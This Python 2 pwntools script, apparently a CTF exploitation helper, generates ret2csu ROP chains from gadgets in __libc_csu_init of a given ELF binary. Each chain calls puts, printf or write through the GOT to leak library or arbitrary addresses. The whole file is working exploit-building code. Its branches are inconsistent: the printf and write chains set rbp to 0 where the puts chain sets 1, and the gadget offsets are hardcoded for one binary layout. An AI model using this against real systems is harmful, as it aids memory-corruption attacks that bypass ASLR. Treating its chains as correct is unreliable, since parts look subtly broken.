from pwn import *
import sys

if len(sys.argv) < 2:
    print "usage: python leakyleak.py <binary> [address_to_print]"
    exit(1)

to_leak = None
if len(sys.argv) > 2:
    try:
        to_leak = int(sys.argv[2], 16)
    except:
        print "error: address to leak must be and exadecimal number"
        exit(1)

binary = ELF(sys.argv[1])

gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)

if "puts" in binary.got:
    #r12 = puts@plt
    #rbx = 0
    #r15d = puts@got
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(1) # rbp"
    print "rop += p64(0x%x) # r12 [puts@got]" % binary.got["puts"]
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    if to_leak == None:
        print "rop += p64(0x%x) # r15 [puts@got]" % binary.got["puts"]
    else:
        print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0) # junk to reach the next gadget"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
elif "printf" in binary.got:
    #r12 = printf@plt
    #rbx = 0
    #r15d = printf@got
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0x%x) # r12 [printf@got]" % binary.got["printf"]
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    if to_leak == None:
        print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
    else:
        print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0) # junk to reach the next gadget"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
elif "write" in binary.got:
    #r12 = write@plt
    #rbx = 0
    #r15d = 1
    #r14 = write@got
    #r13 = 8
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
    print "rop += p64(8) # r13 [sizeof void*]"
    if to_leak == None:
        print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
    else:
        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
    print "rop += p64(1) # r15 [stdout]"
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0) # junk to reach the next gadget"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"
    print "rop += p64(0) # junk"


